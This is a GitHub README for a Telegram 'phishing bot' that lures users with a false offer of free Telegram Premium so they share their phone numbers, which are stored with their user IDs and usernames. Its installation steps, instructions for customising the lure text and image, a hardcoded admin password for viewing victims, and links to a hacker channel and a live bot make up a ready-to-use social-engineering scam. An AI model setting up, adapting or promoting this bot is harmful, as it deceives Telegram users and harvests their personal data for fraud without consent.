# Phone Number Phishing Bot for Telegram Premium 🤖

**Python:** 3.9+  
**Telegram Bot API**

---

## Table of Contents 📚

- [Introduction](#introduction-) 🤔  
- [Features](#features-) 🎉  
- [Installation](#installation-) 💻  
- [Usage](#usage-) 📱  
- [Settings](#settings-) 🔧  
- [License](#license-) 🌟  
- [Example Use Cases](#example-use-cases-) 🖍️  
- [Code Structure](#code-structure-) 🗂️  
- [API Documentation](#api-documentation-) 📚  
- [Commit Messages](#commit-messages-) 🖍️  
- [Community](#community) 👥  

---

## Introduction 🤔

This is a Telegram bot designed to **collect phone numbers** in exchange for free access to **Telegram Premium** 🤝.  
The bot uses the **Telegram Bot API** to communicate with users and **stores their phone numbers** along with user IDs and usernames 📱.

You can edit the text, the buttons requesting the phone number share, and the image displayed in the bot.

---

![photo_5969548008347517558_y](https://github.com/user-attachments/assets/b0bb342c-5a56-4ddd-87ac-7885a3275d81)

---

## Features 🎉

- Offers **free Telegram Premium access** to users 🤝.  
- Users can **share their phone numbers** to claim Telegram Premium 📞.  
- Admins can view a **live list of users** who shared their numbers using `/show` **password-protected** 🔒.  
- **Real-time notifications** ⚡️: Admins who enter `/show 555222` get **notified instantly** when a new user shares their number! 📢  
- The bot sends a **welcome message** with an image and a button to share the phone number 📸.

---

## Installation 💻

To install the bot, follow these steps:

1. **Clone the repository**:  
   ```bash  
   git clone https://github.com/BlackNnja/Telegram-Phishing-Bot.git  
   cd Telegram-Phishing-Bot  
   ```

2. **Install Python**:  
   Make sure you have Python 3.9 or higher. You can download it from the official site: [Python.org](https://www.python.org/downloads/)

3. **Install dependencies**:  
   ```bash  
   pip install -r requirements.txt  
   ```

4. **Replace the bot token**:  
   Replace `YOUR_BOT_TOKEN` with your bot token in the `bot.py` file.

5. **Run the bot**:  
   ```bash  
   python bot.py  
   ```

---

## Usage 📱

1. **Start the bot**:  
   Send `/start` to activate the bot.

2. **Share phone number**:  
   Click the button to share your phone number.

3. **Admin commands**:  
   - `/show 555222` 🔒: View the **list of users** who shared their phone numbers.  
   - **Get real-time notifications** ⚡️: Any admin who enters `/show 555222` gets **instant alerts** when a new user is added.

---

## Settings 🔧

### Update Password  
You can update the password for the `/show` command in the `bot.py` file by changing the value of `PASSWORD` 🔒.

### Change the Opening Image  
- Replace the image in the folder with your own image.  
- Update the path in the code:  
  ```python  
  with open('telegramicon.png', 'rb') as photo:  
  ```

### Adjust Button Text  
- Update the text in the `button_text` variable:  
  ```python  
  button_text = "⭐️ Get 3 months free of Telegram Premium"  
  ```

#### Example:  
Change the following line in the `bot.py` file:  
```python  
button_text = "⭐️ Get 3 months free of Telegram Premium"  
```  
For example:  
```python  
button_text = "🎁 Join Telegram Premium for free now!"  
```

### Change Welcome Message  
- Update the welcome message text in the code:  
  ```python  
  WELCOME_CAPTION = ("\n\n🎉 Welcome to Free Telegram Premium 🎉\n"  
                      "Get 3 months free of Telegram Premium! \n\n"  
                      "Click the button below to share your phone number 📱.\n\n"  
                      "Enjoy! 😊")  
  ```

---

## License 🌟

This project is licensed under the MIT License 🌟. See the LICENSE file for details.

---

## Example Use Cases 🖍️

- Users share their phone numbers for Telegram Premium access 📞.  
- Admins use the `/show` command to view the **real-time** list of users 👁.  
- **Instant notifications** alert admins whenever a new user shares their number 📢.

---

## Code Structure 🗂️

- `bot.py`: The main file containing the bot logic 🖍️.  
- `requirements.txt`: The dependencies file 💻.

---

## API Documentation 📚

The bot uses the Telegram API. You can find the full documentation here: [Telegram Bot API](https://core.telegram.org/bots/api)

---

## Commit Messages 🖍️

- `feat`: Added a new feature 🎉  
- `fix`: Fixed a bug 🚨  
- `docs`: Updated documentation 📄  
- `refactor`: Code improvements without changing functionality ⚙️

---

## Community 👥

- Join our community on Telegram: [t.me/israelihacker](https://t.me/israelihacker)  
- Visit the original bot: [t.me/Premium_TelegramTrial_bot](https://t.me/Premium_TelegramTrial_bot)

---

